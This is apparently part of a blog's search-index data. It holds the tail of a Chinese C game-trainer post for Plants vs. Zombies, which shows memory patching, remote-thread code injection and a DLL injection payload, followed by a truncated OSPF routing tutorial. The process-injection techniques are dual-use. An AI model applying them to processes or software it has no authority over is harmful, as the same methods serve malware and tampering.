WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); bSuccess = TRUE; &#125; &#125; //8. 执行完后释放空间 VirtualFreeEx(hProcess, lpRemoteCodeMem, 0, MEM_RELEASE); &#125; CloseHandle(hProcess); &#125; return bSuccess; } &#x2F;&#x2F;设置卡槽植物BOOL SetPlantCard(HANDLE hProcess,DWORD BaseAddr,DWORD nCard,DWORD plantType) { DWORD cardAddr &#x3D; BaseAddr + 0x355E0C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x868; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x15C; ReadProcessMemory(hProcess, cardAddr, &amp;cardAddr, sizeof(DWORD), NULL); cardAddr +&#x3D; 0x5C+nCard*0x50;&#x2F;&#x2F;卡槽偏移 return WriteProcessMemory(hProcess, cardAddr, &amp;plantType, sizeof(DWORD), NULL);} &#x2F;&#x2F;选择菜单void choiceMenu(HANDLE hProcess,DWORD Pid, LPVOID BaseAddr) { DWORD choice &#x3D; 0; unsigned int num &#x3D; 0; DWORD fogAddr &#x3D; 0; unsigned int x, y, Type; while(1) { system(“cls”); printf(“\\t\\t\\t\\tWelcome to PVZ Modifier!\\n”); printf(“\\t\\t\\t\\t\\t0.退出\\n”); printf(“\\t\\t\\t\\t\\t1.修改阳光数\\n”); printf(“\\t\\t\\t\\t\\t2.修改金钱数\\n”); printf(“\\t\\t\\t\\t\\t3.修改智慧树高\\n”); printf(“\\t\\t\\t\\t\\t4.修改巧克力数\\n”); printf(“\\t\\t\\t\\t\\t5.修改树肥\\n”); printf(“\\t\\t\\t\\t\\t6.修改花肥\\n”); printf(“\\t\\t\\t\\t\\t7.修改杀虫剂\\n”); printf(“\\t\\t\\t\\t\\t8.无限冷却\\n”); printf(“\\t\\t\\t\\t\\t9.恢复冷却\\n”); printf(“\\t\\t\\t\\t\\t10.无限阳光\\n”); printf(“\\t\\t\\t\\t\\t11.恢复阳光消耗\\n”); printf(“\\t\\t\\t\\t\\t12.除雾\\n”); printf(“\\t\\t\\t\\t\\t13.恢复雾\\n”); printf(“\\t\\t\\t\\t\\t14.种植植物\\n”); printf(“\\t\\t\\t\\t\\t15.生成僵尸\\n”); printf(&quot;\\t\\t\\t\\tPlease choose your option:[ ]\\b\\b&quot;); scanf(&quot;%d&quot;, &amp;choice); switch(choice)&#123; case 0: return; case 1: case 2: case 3: case 4: case 5: case 6: case 7: printf(&quot;\\t\\t\\t\\tPlease input Num:&quot;); scanf(&quot;%d&quot;, &amp;num); setSomething(hProcess, BaseAddr, choice - 1, num); break; case 8: Uncooled(hProcess, BaseAddr); break; case 9: RecoveryCooling(hProcess, BaseAddr); break; case 10: UnlimitedSun(hProcess,BaseAddr); break; case 11: RecoverySunConsume(hProcess, BaseAddr); break; case 12: fogAddr=(DWORD)DeFogByHook(hProcess, BaseAddr); break; case 13: RecoveryFogByUnHook(hProcess, BaseAddr,fogAddr ); break; case 14: printf(&quot;请输入X Y PlantType: &quot;); scanf(&quot;%d%d%d&quot;, &amp;x, &amp;y, &amp;Type); GrowPlantByInjectCode(Pid, BaseAddr,x,y,Type ); break; case 15: printf(&quot;请输入X Y ZombieType: &quot;); scanf(&quot;%d%d%d&quot;, &amp;x, &amp;y, &amp;Type); GrowZombieByInjectCode(Pid, BaseAddr, x, y, Type); break; &#125; &#125; } int main() { //获取进程pid DWORD Pid = GetProcessIdByName(L&quot;PlantsVsZombies.exe&quot;); //打开进程,获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,Pid); //获取进程基址 DWORD BaseAddr=GetModuleBaseAddress(Pid, L&quot;PlantsVsZombies.exe&quot;); choiceMenu(hProcess, Pid, BaseAddr); //dll注入 //InjectDllByRemoteThread(Pid, L&quot;E:\\\\MyProject\\\\vsProjects\\\\Project1\\\\Debug\\\\DllPlant3.dll&quot;); //int op = 1; //printf(&quot;输入0卸载dll:&quot;); //scanf(&quot;%d&quot;, &amp;op); //if(op==0) // UnLoadDllByRemoteThread(Pid, L&quot;E:\\\\MyProject\\\\vsProjects\\\\Project1\\\\Debug\\\\DllPlant3.dll&quot;);//加载完dll之后释放掉 CloseHandle(hProcess); return 0; }DLL代码 复制代码 隐藏代码#include&lt;windows.h&gt;#include&lt;stdio.h&gt; &#x2F;&#x2F;调用函数BOOL GrowPlant(DWORD BaseAddr, DWORD x, DWORD y, DWORD TypePlant) { LPVOID PlantFunc &#x3D; BaseAddr + 0x18D70; __asm { pushad push -1 &#x2F;&#x2F;-1 push TypePlant &#x2F;&#x2F;植物类型 mov eax, y &#x2F;&#x2F;y push x &#x2F;&#x2F;x mov ecx, BaseAddr mov ecx, [ecx+0x355E0C] mov ecx, [ecx + 0x868] push ecx call PlantFunc popad } return TRUE;} BOOL GrowZombie(DWORD BaseAddr, DWORD x, DWORD y, DWORD ZombieType) { LPVOID PlantZombieFunc &#x3D; BaseAddr + 0x35390; __asm { pushad push x push ZombieType mov eax,y mov ecx,BaseAddr mov ecx,[ecx+0x355E0C] mov ecx,[ecx+0x868] mov ecx,[ecx+0x178] &#x2F;&#x2F;ebp call PlantZombieFunc popad } return TRUE;} BOOL WINAPI DllMain(HMODULE hInstance, DWORD fdwReason, LPVOID lpReserved) { DWORD BaseAddr &#x3D; GetModuleHandle(NULL); DWORD pid &#x3D; GetCurrentProcessId(); HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: MessageBoxW(0, L&quot;ProcessAttachDll!&quot;, L&quot;window2&quot;, 0); GrowPlant(BaseAddr,5,3,23); GrowZombie(BaseAddr, 6, 2, 23); break; &#x2F;* case DLL_THREAD_ATTACH: printf(“ThreadAttach!\\n”); break; case DLL_THREAD_DETACH: if (lpReserved &#x3D;&#x3D; NULL) { FreeLibrary(hInstance); } break;*&#x2F; case DLL_PROCESS_DETACH: MessageBoxW(0, L”ProcessDeTachDll!”, L”window2”, 0); break; } return TRUE;}","categories":[],"tags":[]},{"title":"ospf","slug":"ospf详解","date":"2022-11-15T16:01:03.000Z","updated":"2023-12-02T12:27:48.406Z","comments":true,"path":"2022/11/16/ospf详解/","link":"","permalink":"http://example.com/2022/11/16/ospf%E8%AF%A6%E8%A7%A3/","excerpt":"开放最短路径优先Open Shortest Path First 开放最短路径优先，是一个开放标准的链路状态路由协议（an open-standard Link State routing protocol）。所有链路状态路由协议都是对链路状态进行通告。当链路状态路由器开始在某条网络链路上运作时，逻辑网络的相关信息就被添加到路由器的本地链路状态数据库(Link State Database, LSDB)中。该本地路由器此时在其运作链路上，发出Hello数据包，以确定出是否有其它链路状态路由器也在其各自接口上运行着链路状态路由协议。OSPF直接运行在 IP 协议上，使用 IP 下编号为89号的协议。 OSPF概述及基础知识OSPF Overview and Fundamentals","text":"开放最短路径优先Open Shortest Path First 开放最短路径优先，是一个开放标准的链路状态路由协议（an open-standard Link State routing protocol）。所有链路状态路由协议都是对链路状态进行通告。当链路状态路由器开始在某条网络链路上运作时，逻辑网络的相关信息就被添加到路由器的本地链路状态数据库(Link State Database, LSDB)中。该本地路由器此时在其运作链路上，发出Hello数据包，以确定出是否有其它链路状态路由器也在其各自接口上运行着链路状态路由协议。OSPF直接运行在 IP 协议上，使用 IP 下编号为89号的协议。 OSPF概述及基础知识OSPF Overview and Fundamentals 人们为 OSPF 撰写了多个请求评议（Requests for Comments, RFCs)。在本小节，将通过一些 OSPF 有关的最常见的几个 RFCs ，来了解一下 OSPF 的历史。 OSPF 工作组成立于1987年，自成立以后，该工作组发布了为数众多的 RFCs 。下面列出了 OSPF 有关的一些最常见的 RFCs 。 RFC 1131 – OSPF规格，OSPF SpecificationRFC 1584 – OSPF的多播扩展, Multicast Extensions to OSPFRFC 1587 – OSPF的 NSSA 选项，the OSPF NSSA OptionRFC 1850 – OSPF版本2的管理信息库，OSPF Version 2 Management Informaiton BaseRFC 2328 – OSPF版本2RFC 2740 – OSPF版本3RFC 1131对 OSPF 的第一次迭代（the first iteration of OSPF）进行了说明, 而应用在明确该协议是否工作的早期测试中。 RFC 1584为 OSPF 提供了对 IP 多播流量的支持扩展。这通常被称为多播 OSPF （Multicast OSPF, MOSPF）。但该标准不常用到，而最重要的是思科不支持该标准。 RFC 1587 对一种 OSPF 的次末梢区域（Not-So-Stubby Area, NSSA）的运作方式进行了说明。 NSSA 允许通过一台自治系统边界路由器（an Autonomous System Boundary Router, ASBR）, 采用一条 NSSA 的外部LSA, 实现外部路由知识的注入（the injection of external routing knowledge）。在本模块的稍后会对不同的 NSSAs 进行说明。 RFC 1850实现了使用简单网络管理协议（Simple Network Management Protocol, SNMP）对 OSPF 的网络管理。在网络管理系统中， SNMP 用于监测接入网络设备中需要留心的一些情况。本标准的应用超出了 CCNA 考试要求范围，不会在本书中进行说明。 RFC 2328详细陈述了 OSPF 版本2的最新更新，而 OSPF 版本2正是现今在用的默认版本。 OSPF 版本2最初是在RFC 1247中进行说明的，该 RFC 解决了 OSPF 版本1初次发布中发现的一系列问题，并对该协议进行了修正，实现了未来修改不致产生出向后兼容问题。正因为如此， OSPF 版本2与版本1是不兼容的。 最后，RFC 2740说明了为支持 IPv6 而对 OSPF 做出的修改（也就是版本3）。应假定本模块中所有对 OSPF 一词的使用，都是指的 OSPF 版本2。 链路状态基础Link State Fundamentals 当对某条特定链路(也就是接口）开启链路状态路由协议时，与那个网络有关的信息就被加入到本地 LSDB 中。该本地路由器此时就往其运作的各链路上发送Hello数据包，以确定有否其它链路状态路由器也在接口上运行着。Hello数据包用于邻居发现，并在邻居路由器之间维护邻接关系。本模块稍后部分会详细说明这些消息。 在找到一台邻居路由器后， 假定两台路由器在同一子网且位于同一区域，同时诸如认证方法及计时器等其它参数都是一致的（ identical ），那么本地路由器就尝试建立一个邻接关系（ adjacency ）。此邻接关系令到两台路由器将摘要的 LSDB 信息通告给对方。这种信息交换，交换的并非真实的详细数据库信息，而是数据的摘要。 各台路由器参照其本地 LSDB ，对收到的摘要信息做出评估，以确保其有着最新信息。如邻接关系的一侧认识到它需要一个更新，路由器就从邻接路由器请求新信息。而来自邻居路由器的更新就包含了 LSDB 中的具体数据。此交换过程持续到两台路由器都拥有同样的 LSDB 。 OSPF 用到不同类型的报文，以交换数据库信息，从而确保所有路由器都有着网络的统一视图。这些不同的数据包类型将在本模块稍后进行详细说明。 紧接着数据库的交换， SPF 算法就运行起来，创建出到某个区域或网络主干中所有主机的最短路径树, SPF算法将执行运算的路由器，作为该树的根（Following the database exchange, the SPF algorithm runs and creates a shortest path tree to all hosts in an area or in the network backbone, with the router that is performing the calculation at the root of that tree）。在第 10 天中，对 SPF 算法进行了简要介绍。 OSPF基础OSPF Fundamentals 与 EIGRP 能够支持多个网络层协议不同， OSPF 只能支持 IP ，也就是 IPv4 和 IPv6 。和 EIGRP 相同的是， OSPF 支持 VLSM 、认证及在诸如以太网这样的多路访问（Multi-Access networks）网络上，于发送和接收更新时，利用 IP 多播技术（IP Multicast）。 OSPF是一种层次化的路由协议，将网络以逻辑方式，分为称作区域的众多子域。这种逻辑分段方法，用于限制链路状态通告在 OSPF 域中扩散的范围（OSPF is a hierarchical routing protocol that logically divides the network into subdomains referred to as areas. This logical segmentation is used to limit the scope of Link State Advertisements(LSAs) flooding throughout the OSPF domain）。 LSAs 是由运行 OSPF 的路由器发出的特殊类型数据包。在区域内和区域间用到不同类型的 LSAs 。通过限制一些类型的 LSAs 在区域间传播， OSPF 的层次化实现有效地减少了 OSPF 网络中路由协议流量的数量。 注意： OSPF的这些 LSAs 会在第 39 天详细说明。 在多区域 OSPF 网络中，必须指定一个区域作为骨干区域, 或者叫Area 0。OSPF骨干就是此 OSPF 网络的逻辑中心。其它非骨干区域都必须物理连接到骨干。但因为在非骨干区域和骨干区域之间有着一条物理连接，并非总是可能或可行的，所以 OSPF 标准允许使用到骨干的虚拟连接。这些虚拟连接也就是常说的虚拟链路，但此概念是不包括在当前的 CCNA 大纲中的（In a multi-area OSPF network, one area must be designated as the backbone area, or Area 0. The OSPF backbone is the logical centre of the OSPF network. All other non-backbone areas must be connected physically to the backbone. However, because it is not always possible or feasible to have a physical connection between a non-backbone area and the backbone, the OSPF standart allows the use of virtual connections to the backbone. These virtual connections are known as virtual links, but this concept is not included in the current CCNA syllabus）。 位处各区域中的路由器，都存储着其所在区域的详细拓扑信息。而在各区域中，一台或多台的路由器，又被作为区域边界路由器（Area Border Routers, ABRs），区域边界路由器通过在不同区域之间通告汇总路由信息，而促进区域间的路由（facilitate inter-area routing by advertising summarised routing informaiton between the differenct areas）。本功能实现 OSPF 网络中的以下几个目标。 在 OSPF 域层面减小 LSAs 的扩散范围, Reduces the scope of LSAs flooding throughout the OSPF domain在区域之间隐藏详细拓扑信息, Hides detailed topology informaiton between areasOSPF域中端到端连通性的实现, Allows for end-to-end connectivity within the OSPF domain在 OSPF 域内部创建逻辑边界, Creates logical boundaries within the OSPF domain注意： 尽管 ICND1 大纲仅涉及到单区域 OSPF （single-area OSPF）, 但为把大部分理论纳入讨论背景，有必要说一下多区域 OSPF （multi-area OSPF）。 OSPF骨干区域从 ABRs 接收到汇总路由信息。该路由信息被散布到 OSPF 网络中的所有其它非骨干区域。在网络拓扑发生变化时，变化信息就被散布到整个的 OSPF 域，令到所有区域中的所有路由器都有着网络的统一视图（The OSPF backbone area receives summarised routing informaiton from the ABRs. The routing informaiton is disseminated to all other non-backbone areas within the OSPF network. When a change to the network topology occurs, this informaiton is disseminated throughout the entire OSPF domain, allowing all routers in all areas to have a consistent view of the network）。下图12.1演示的网络拓扑，就是一个多区域 OSPF 部署的示例。 一个多区域 OSPF 网络 图12.1 – 一个多区域 OSPF 网络 图12.1演示了一个基本的多区域 OSPF 网络。1、2号区域连接到0号区域，也就是 OSPF 骨干上。1号区域中，路由器R1、R2和R3交换着区域内（intra-area）路由信息，并维护着那个区域的详细拓扑。R3作为 ABR ，生成一条区域间汇总路由（an inter-area summary route）, 并将该路由通告给 OSPF 骨干。 R4，也就是2号区域的 ABR ，从0号区域接收到R3通告出的汇总信息，并将其扩散到其邻接区域。这样做就令到R5和R6知悉位处其本地区域外、但仍在 OSPF 域内的那些路由了。同样概念也适用于2号区域内的路由信息（R4, the ABR for Area 2, receives the summary informaiton from Area 0 and floods it into its adjacent area. This allows routers R5 and R6 to know of the routes that reside outside of their local area but within the OSPF domain. The same concept would also be applicable to the routing informaiton within Area 2）。 总的来讲， ABRs 都维护着所有其各自连接区域的 LSDB 信息。而各个区域中的所有路由器，都有着属于其特定区域的详细拓扑信息。这些路由器交换着区域内的路由信息。 ABRs 则将所连接区域的汇总信息通告给其它 OSPF 区域，以实现域内各子域（区域）间的路由（In summation, the ABRs maintain LSDB informaiton for all the areas in which they are connected. All routers within each area have detailed topology informaiton pertaining to that specific area. These routers exchange intra-area routing informaiton. The ABRs advertise summary informaiton from each of their connected areas to other OSPF areas, allowing inter-area routing within the domain）。 注意： 本书后面会详细说明OSPF ABRs及其它 OSPF 路由器类型。 组网类型Network Types 对不同传输介质， OSPF 采用不同默认组网类型，有下面这些: 非广播组网（在多点非广播多路复用传输介质上，也就是 FR 和ATM, 默认采用此种组网类型， Non-Broadcast，default on Multipoint Non-Broadcast Multi-Access(FR and ATM)）点对点组网（在 HDLC 、 PPP 、 FR 及 ATM 的 P2P 子接口，以及 ISDN 介质上，默认采用此种组网类型， Point-to-Point，default on HDLC, PPP, P2P subinterface on FR and ATM, and ISDN）广播组网（在以太网和令牌环介质上，默认采用此种组网类型， Broadcast，default on Ethernet and Token Ring）点对多点组网（Point-to-Multipoint）环回组网（默认在环回接口上采用此种组网类型， Loopback，default on Loopback interfaces）非广播网络是指那些没有原生的广播或多播流量支持的网络类型。非广播类型网络的最常见实例就是帧中继网络。非广播类型网络需要额外配置，以实现广播和多播支持。在这种网络上， OSPF 选举出一台指定路由器(a Designate Router, DR), 及&#x2F;或一台备用指定路由器（a Backup Designated Router, BDR）。在本书后面会对这两台路由器进行说明。 思科 IOS 软件中，非广播类型网络上开启了 OSPF 的路由器，默认每30秒发出Hello数据包。若4个Hello间隔，也就是120秒中都没有收到Hello数据包，那么该邻居路由器就被认为是“死了”。下面的输出演示了在一个帧中继串行接口上show ip ospf interface命令的输出。 R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type NON_BROADCAST, Cost: 64 Transmit Delay is 1 sec, State DR, Priority 1 Designated Router (ID) 2.2.2.2, Interface address 150.1.1.2 Backup Designated Router (ID) 1.1.1.1, Interface address 150.1.1.1 Timer intervals configured, Hello 30, Dead 120, Wait 120, Retransmit 5 oob-resync timeout 120 Hello due in 00:00:00 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 2, maximum is 2 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 (Backup Designated Router) Suppress Hello for 0 neighbor(s)一条点对点连接, 简单来说就是一条两个端点之间的连接。 P2P 连接的实例，包括采用 HDLC 及 PPP 封装的物理 WAN 接口，以及 FR 和 ATM 的点对点子接口。OSPF点对点组网类型中，不会选举出 DR 和BDR。在 P2P 类型网络上， OSPF 每10秒发出Hello数据包。在这些网络上，”死亡“间隔是Hello间隔的4倍，也就是40秒（A Point-to-Point(P2P) connection is simply a connection between two endpoints only. Examples of P2P connections include physical WAN interfaces using HDLC and PPP encapsulation, and Frame Relay(FR) and Asynchronous Transfer Mode(ATM) Point-to-Point subinterfaces. No DR or BDR is elected on OSPF Point-to-Point network types. By default, OSPF sends Hello packets out every 10 seconds on P2P network types. The “dead” interval on these network types is four times the Hello interval, which is 40 seconds）。下面的输出演示了在一条 P2P 链路上的show ip ospf interface命令的输出。 R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type POINT_TO_POINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_POINT Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:03 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 1 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 Suppress Hello for 0 neighbor(s)广播类型网络，是指那些原生支持广播和多播流量的网络，最常见例子就是以太网。就如同在非广播网络中一样， OSPF 也会在广播网络上选举一台 DR 及&#x2F;或 BDR 。默认情况下， OSPF 每隔10秒发出Hello数据包，而如在4倍 Hello 间隔中没有收到Hello数据包，就宣告邻居”死亡“。下面的输出演示了在一个FastEthernet接口上show ip ospf interface命令的输出。 R2#show ip ospf interface FastEthernet0&#x2F;0FastEthernet0&#x2F;0 is up, line protocol is up Internet Address 192.168.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type BROADCAST, Cost: 64 Transmit Delay is 1 sec, State BDR, Priority 1 Designated Router (ID) 192.168.1.3, Interface address 192.168.1.3 Backup Designated Router (ID) 2.2.2.2, Interface address 192.168.1.2 Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:04 Supports Link-local Signaling (LLS) Index 1&#x2F;1, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 1 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 192.168.1.3 (Designated Router) Suppress Hello for 0 neighbor(s)点对多点是一种非默认 OSPF 组网类型。也就是说，此种组网类型必须使用接口配置命令ip ospf network point-to-point-multicast [non-broadcast]手动进行配置。默认情况下，该命令默认应用于一个广播型点对多点类型网络的。此默认组网类型允许 OSPF 采用多播数据包来动态地发现其邻居路由器。此外在广播型点对多点网络类型上，不进行DR&#x2F;BDR选举（Point-to-Multipoint is a non-default OSPF network type. In other words, this network type must be configured manually using the ip ospf network point-to-multipoint [non-broadcast] interface configuration command. By default, this command defaults to a Broadcast Point-to-Multipoint network type. This default network type allows OSPF to use Multicast packets to discover its neighbour routers. In addition, there is no DR&#x2F;BDR election held on Broadcast Point-to-Multipoint network types）。 关键字[non-broadcast]将点对多点网络配置为非广播点对多点网络。这样做就要求静态的 OSPF 邻居配置，因为此时 OSPF 不会使用多播来动态地发现其邻居路由器。此外，这种网络类型不要求为指定网段进行 DR 及&#x2F;或 BDR 选举。此种组网的主要用途，即允许分配邻居开销到邻居路由器，而非使用指定给接口的开销，作为那些自所有邻居处收到的路由的开销（The [non-broadcast] keyword configures the Point-to-Multipoint network type as a Non-Broadcast Point-to-Multipoint network. This requires static OSPF neighbour configuration, as OSPF will not use Multicast to discover dynamically its neighbour routers. Additionally, this network type does not require the election of a DR and&#x2F;or a BDR router for the designated segment. The primary use of this network type is to allow neighbor costs to be assigned to neighbors instead of using the interface-assigned cost for routes received from all neighbors）。 点对多点组网类型，典型地用于部分全通辐射状非广播多路访问网络。不过此种组网类型也可指定给诸如广播多路访问网络（比如以太网）等的其它类型网络（The Point-to-Multipoint network type is typically used in partial-mesh hub-and-spoke Non-Broadcast Multi-Access(NBMA) networks. However, this network type can also be specified for other networks, such as Broadcast Multi-Access networks(e.g., Ethernet)）。默认情况下，在点对多点网络上， OSPF 每30秒发出一个Hello数据包。默认死亡间隔是Hello间隔的4倍，也就是120秒。 下面的输出演示了在一个经手动配置为点对多点网络的帧中继串行接口上的show ip ospf interface命令的输出。 R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type POINT_TO_MULTIPOINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_MULTIPOINT Timer intervals configured, Hello 30, Dead 120, Wait 120, Retransmit 5 oob-resync timeout 120 Hello due in 00:00:04 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 2 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 Suppress Hello for 0 neighbor(s)OSPF要求链路上两台路由器组网类型一致（一致的意思是两台路由器要么都进行选举要么都不进行选举）的主要原因在于计时器的数值。就像上面各个输出中演示的那样，不同组网类型采用了不同Hello数据包发送及死亡计时器间隔。为成功建立一个 OSPF 邻接关系，在两台路由器上这些数值必须匹配。 思科 IOS 软件允许通过使用接口配置命令ip ospf hello-interval &lt;1-65535&gt;及ip ospf dead-interval [&lt;1-65535&gt;|minimal]，对默认OSPF Hello数据包及死亡计时器进行修改。ip ospf hell0-interval &lt;1-65535&gt;命令用于指定Hello间隔的秒数。在执行该命令后，软件会自动将死亡间隔配置为所配置的Hello包间隔的4倍。比如，假定某台路由器做了如下配置。 R2(config)#interface Serial0&#x2F;0R2(config-if)#ip ospf hello-interval 1R2(config-if)#exit通过在上面的R2上将Hello数据包间隔设置为1, 思科 IOS 软件就会自动的将默认死亡计时器调整为Hello间隔的4倍，就是4秒。下面的输出对此进行了演示。 R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 10.0.2.4&#x2F;24, Area 2 Process ID 4, Router ID 4.4.4.4, Network Type POINT_TO_POINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_POINT Timer intervals configured, Hello 1, Dead 4, Wait 4, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:00…[Truncated Output]配置OSPFOSPF Configuration 本节对 OSPF 配置基础进行说明。 在思科 IOS 软件中开启OSPFEnabling OSPF in Cisco IOS Software 在思科 IOS 软件中，通过使用全局配置命令router ospf [process id]开启 OSPF 。关键字[process id]是本地有效的(locally sinificant)，邻接关系的建立无需网络中所有路由器的进程号一致。运用本地有效的进程号，允许在同一台路由器上配置多个 OSPF 实例。 OSPF进程号是一个1与65535之间的整数。每个 OSPF 进程都维护着其独立链路状态数据库（ LSDB ）；但是，所有路由都放进的是同一 IP 路由表。也就是说，对配置在路由器上的各个单独 OSPF 进程，并没有各自唯一的 IP 路由表。 在思科 IOS 软件早期版本中，如路由器上没有至少一个的接口配置了有效 IP 地址且处于up&#x2F;up状态，就无法开启 OSPF 。此限制在当前版本思科 IOS 软件中去除了。假如路由器没有接口配置了有效 IP 地址且处于up&#x2F;up状态，那么思科 IOS 将创建出一个接近数据库（a Proximity Database, PDB）并允许创建出进程。但是，要记住除非选定路由器 ID ，该进程就是非活动的进程，而路由器 ID 的选定，可通过下面两种方式完成。 在某个接口上配置一个有效 IP 地址，并将该接口开启使用命令router-id为该路由器手动配置一个 ID （见下）作为一个例子，看看下面的所有接口都关闭的路由器。 R3#show ip interface briefInterface IP-Address OK? Method Status ProtocolFastEthernet0&#x2F;0 unassigned YES manual administratively down downSerial0&#x2F;0 unassigned YES NVRAM administratively down downSerial0&#x2F;1 unassigned YES unset administratively down down接着，使用全局配置命令router ospf [process id]在该路由器上开启了 OSPF ， 如下面输出所示。 R3(config)#router ospf 1R3(config-router)#exit基于此配置，思科 IOS 软件分配给该进程一个默认0.0.0.0的路由器 ID ，如下面show ip protocols命令的输出所示。 R3#show ip protocolsRouting Protocol is “ospf 1” Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 0.0.0.0 Number of areas in this router is 0. 0 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks:Reference bandwidth unit is 100 mbps Routing Information Sources: Gateway Distance Last Update Distance: (default is 110)但是，命令show ip ospf [process id]揭示出该进程实际上并不是活动的，且表明需要配置一个路由器 ID ， 其输出如下面所示。 R3#show ip ospf 1%OSPF: Router process 1 is not running, please configure a router-id开启接口或网络的 OSPF 路由Enabling OSPF Routing for Interfaces or Networks 在开启 OSPF 后，就可以执行两个操作，来为路由器上一个或更多的网络或接口开启 OSPF 路由。这两个操作如下。 使用路由器配置命令(router configuration command)[network] [wildcard] area [area id]使用接口配置命令ip ospf [process id] area [area id]与 EIGRP 不同， OSPF 强制使用反掩码且必须配置反掩码; 但与在 EIGRP 中的情况一样，反掩码提供了同样的功能，也就是匹配指定范围中的接口（unlike EIGRP, the wildcard is mandatory in OSPF and must be configured; however, as is the case with EIGRP, it serves the same function in that it matches interfaces within the range specified）。比如，语句network 10.0.0.0 0.255.255.255 area 0，就会对10.0.0.1&#x2F;30、10.5.5.1&#x2F;24, 甚至10.10.10.1&#x2F;25这样的 IP 地址和子网掩码组合的接口，开启 OSPF 路由。基于该 OSPF 网络配置，这些接口都会被分配到 0 号区域。 注意： OSPF反掩码可以与传统子网掩码同样格式敲入，比如network 10.0.0.0 255.0.0.0 area 0。在这种情况下，思科 IOS 软件就会将子网掩码翻转，将得到的反掩码输入到运行配置（the running configuration）。另外要记住OSPF也支持使用全 1s 和全 0s 反掩码，来对某个指定接口开启OSPF。这样的配置在某个特定接口上开启 OSPF ，但路由器通告配置在该接口自身的实际子网掩码（this configuration enables OSPF on a paricular interface but the router advertises the actual subnet mask configured on the interface itself）。 在执行了network [network] [wildcast] area [area id]命令后，路由器就在与指定网络和反掩码组合匹配的那些接口上发出Hello数据包，来尝试发现邻居路由器。接着在 OSPF 数据库交换期间，将连接子网通告给一台或更多的邻居路由器，最终，它们将所有子网信息都被加入到这些 OSPF 路由器的 OSPF 链路状态数据库（OSPF LSDB）中。 在命令network [network] [wildcard] area [area id]之后，路由器又对最具体条目做出匹配，以决定将接口要分配给的区域。作为实例，想想下面这些 OSPF 网络语句。 第一条网络配置语句：network 10.0.0.0 0.255.255.255 area 0第二条：network 10.1.0.0 0.0.255.255 area 1第三条：network 10.1.1.0 0.0.0.255 area 2第四条：network 10.1.1.1 0.0.0.0 area 3第五条：network 0.0.0.0 0.0.0.0 area 4按照路由器上的此种配置，同时路由器上又配置了如下表12.1中展示的这些环回接口。 接口 IP地址&#x2F;掩码Loopback 0 10.0.0.1/32Loopback 1 10.0.1.1/32Loopback 2 10.1.0.1/32Loopback 3 10.1.1.1/32Loopback 4 10.2.0.1/32就像前面指出的那样，在执行了network [network] [wildcard] area [area id]命令后，路由器匹配最具体的网络条目（最小的网络），来决定该接口应分配到的区域。对于在路由器上的网络配置语句及已配置的接口，命令show ip ospf interface brief会显示出这些接口都分配给了以下 OSPF 区域。 R1#show ip ospf interface briefInterface PID Area IP Address&#x2F;Mask Cost State Nbrs F&#x2F;CLo4 1 0 10.2.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo1 1 0 10.0.1.1&#x2F;32 1 LOOP 0&#x2F;0Lo0 1 0 10.0.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo2 1 1 10.1.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo3 1 3 10.1.1.1&#x2F;32 1 LOOP 0&#x2F;0注意： 在运行配置（the running configuration）中，无需考虑网络语句敲入顺序，路由器的show running-config输出中最具体的网络条目，始终列在前面。 接口配置命令ip ospf [process id] area [area id]令到无需使用路由器配置命令network [network] [wildcard] area [area id]。该命令对某个指定接口开启 OSPF 路由，同时将该接口分配给指定 OSPF 区域。这两个命令完成同样的基本功能，且可互换使用。 此外，比如有两台路由器是背靠背连接（connected back-to-back），一台使用接口配置命令ip ospf [process id] area [area id]进行了配置，而其邻居路由器使用路由器配置命令network [network] [wildcard] area [area id]进行了配置，假设两个区域 IDs 